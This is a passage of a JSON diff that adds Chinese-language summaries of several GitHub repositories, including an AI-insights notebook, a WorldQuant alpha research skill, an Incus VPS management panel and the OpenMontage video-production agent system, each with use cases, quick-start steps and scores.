+      "description": "",
+      "language": "Unknown",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-22T14:43:10Z",
+      "url": "https://github.com/i5ting/learn-ai-practice",
+      "analysis": {
+        "positioning": "狼叔的AI技术洞察与实践集结，深度剖析AI未来趋势与Agent技术。",
+        "useCases": [
+          "你对AI技术发展感到迷茫 → 它为你提供狼叔对AI未来趋势的独到见解和思考。",
+          "你想系统学习AI Agent的核心概念和演进路径 → 它为你梳理ReAct、CoT、Agent Loop等关键知识点。",
+          "你正在寻找AI开发与研究的实用工具和代码库 → 它为你精选终端、CLI、桌面工具及相关Python库。"
+        ],
+        "audience": "适合关注AI前沿趋势、AI Agent技术及开发实践的开发者、研究者和技术爱好者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "克隆项目仓库",
+            "阅读README文档，探索狼叔的AI思考、概念和工具推荐"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "LLM Wiki (by Karpathy)",
+            "method": "Gist（在线文本集合）",
+            "models": "N/A（知识库）",
+            "pricing": "免费"
+          },
+          {
+            "name": "autoresearch (by Karpathy)",
+            "method": "GitHub Repo（自动化研究工具/思路集合）",
+            "models": "N/A（工具/思路）",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目明确是“狼叔的ai自留地”，内容充满个人洞察、批判性思考和对未来趋势的独到判断，风格鲜明且有强烈主观色彩。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计0/0，表明这是一个个人分享和整理的项目，非社区驱动，活跃度较低。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:49:27.126Z"
+    },
+    {
+      "owner": "QuantML-Research",
+      "repo": "wq-alpha-research",
+      "fullName": "QuantML-Research/wq-alpha-research",
+      "description": "A self-evolving WorldQuant BRAIN alpha research skill.",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-19T13:23:11Z",
+      "url": "https://github.com/QuantML-Research/wq-alpha-research",
+      "analysis": {
+        "positioning": "自动化和优化WorldQuant Alpha研究流程的AI技能。",
+        "useCases": [
+          "你要设计Alpha策略 → 它帮你生成、测试和优化Alpha表达式。",
+          "你要查找可用数据字段 → 它帮你快速定位和提供本地字段上下文。",
+          "你的策略模拟失败 → 它帮你诊断失败原因（如周转率问题）。",
+          "你要评估Alpha表现和避免同质化 → 它帮你检查IS指标和计算自相关性。",
+          "你希望从每次研究中吸取经验 → 它帮你将研究经验沉淀为可复用规则。"
+        ],
+        "audience": "WorldQuant BRAIN平台上的量化研究员，用于提升Alpha策略挖掘效率和质量。",
+        "quickStart": {
+          "prerequisites": "Python环境，WorldQuant BRAIN平台账号。",
+          "steps": [
+            "从`SKILL.md`生成或修改Alpha表达式。",
+            "运行模拟并检查IS指标。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目目标明确，解决WorldQuant Alpha研究中的核心痛点。提供了具体的问题诊断、经验沉淀机制和实用挖掘规则，具有清晰的自演进闭环，能显著提高研究效率。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无开启或关闭的Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:49:40.517Z"
+    },
+    {
+      "owner": "qwer-xyz",
+      "repo": "incudal",
+      "fullName": "qwer-xyz/incudal",
+      "description": "基于 Incus 的 LXC / KVM NAT VPS 销售、交付与管理面板。",
+      "language": "TypeScript",
+      "topics": [
+        "hosting",
+        "incus",
+        "lxc",
+        "nat",
+        "server"
+      ],
+      "license": "BSD-3-Clause",
+      "createdAt": "2026-06-20T06:20:02Z",
+      "url": "https://github.com/qwer-xyz/incudal",
+      "analysis": {
+        "positioning": "Incus/LXC/KVM NAT VPS 销售与管理一体化平台",
+        "useCases": [
+          "想提供NAT VPS服务 → 它帮你一站式销售、交付和管理基于 Incus 的 LXC/KVM NAT VPS。",
+          "需要自动化主机资源 → 它帮你管理实例、套餐、镜像、节点和宿主机代理，实现资源自动化调度。",
+          "寻找免费开源的云主机面板 → 它提供完整的用户/管理员后台，支持计费、工单等运营功能。"
+        ],
+        "audience": "小型云服务商、VPS 销售商或个人站长，寻求自动化 Incus 虚拟化服务交付与运营方案。",
+        "quickStart": {
+          "prerequisites": "Docker, Docker Compose, Git",
+          "steps": [
+            "git clone qwer-xyz/incudal && cd incudal",
+            "cp .env.example .env 并编辑关键配置",
+            "生成或放置证书与密钥于 server/certs 目录",
+            "docker compose up -d --build",
+            "配置反向代理（如 Nginx）到 127.0.0.1:3000 并启用 HTTPS"
+          ],
+          "note": "部署需自备 SSL 证书并配置反向代理。"
+        },
+        "competitors": [],
+        "pricing": "免费（基于 BSD-3-Clause 开源协议）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "技术栈现代 (Vue 3, Fastify, Go Agent)，项目功能覆盖全面，部署流程清晰，文档详细，具备商业化运营潜力。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 活跃度极低 (0 开/1 关)，可能项目尚处于早期或社区交流主要通过 Telegram 群组。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-06-25T05:49:51.781Z"
+    },
+    {
+      "owner": "calesthio",
+      "repo": "OpenMontage",
+      "fullName": "calesthio/OpenMontage",
+      "description": "World's first open-source, agentic video production system. 12 pipelines, 52 tools, 500+ agent skills. Turn your AI coding assistant into a full video production studio.",
+      "language": "Python",
+      "topics": [
+        "agent",
+        "agentic-ai",
+        "ai",
+        "claude",
+        "copilot",
+        "cursor",
+        "elevenlabs",
+        "ffmpeg",
+        "flux",
+        "image-generation",
+        "open-source",
+        "openai",
+        "python",
+        "remotion",
+        "stable-diffusion",
+        "text-to-speech",
+        "text-to-video",
+        "video-generation",
+        "video-production"
+      ],
+      "license": "AGPL-3.0",
+      "createdAt": "2026-03-29T15:23:22Z",
+      "url": "https://github.com/calesthio/OpenMontage",
+      "analysis": {
+        "positioning": "首个开源智能体视频制作系统，将AI编码助手升级为全能工作室。",
+        "useCases": [
+          "你有一个AI编码助手 → 它帮你规划、生成、剪辑视频，甚至创作高质量电影预告片或动画短片。",
+          "你需要自动化视频内容生产 → 它帮你通过自然语言指令，实现从概念到成片的整个视频制作流程。",
+          "你想基于免费或开源素材制作“真实”视频 → 它帮你检索素材、生成动态剪辑、编辑时间线并渲染成片。"
+        ],
+        "audience": "开发者、内容创作者，希望通过AI Agent自动化、智能化视频制作流程。",
+        "quickStart": {
+          "prerequisites": "Python环境，一个支持集成AI Agent的AI编码助手（如Copilot, Cursor）。",
+          "steps": [
+            "克隆项目并设置Python环境与依赖。",
+            "启动OpenMontage系统，并通过你的AI编码助手输入视频制作指令。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "RunwayML",
+            "method": "SaaS平台/Web UI",
+            "models": "自研模型",
+            "pricing": "部分免费/付费"
+          },
+          {
+            "name": "Pika Labs",
+            "method": "Discord/Web UI",
+            "models": "自研模型",
+            "pricing": "部分免费/付费"
+          }
+        ],
+        "pricing": "免费，基于AGPL-3.0开源许可。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目概念新颖，将AI Agent与视频制作深度结合，实现全链路自动化，功能强大且星标数高。但Issue解决效率有待提升。",
+        "isVibeCoding": true,
+        "communityActivity": "社区讨论活跃，但Issue开启与关闭比例显示问题解决速度一般。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:50:24.456Z"
     }
   ]
 }
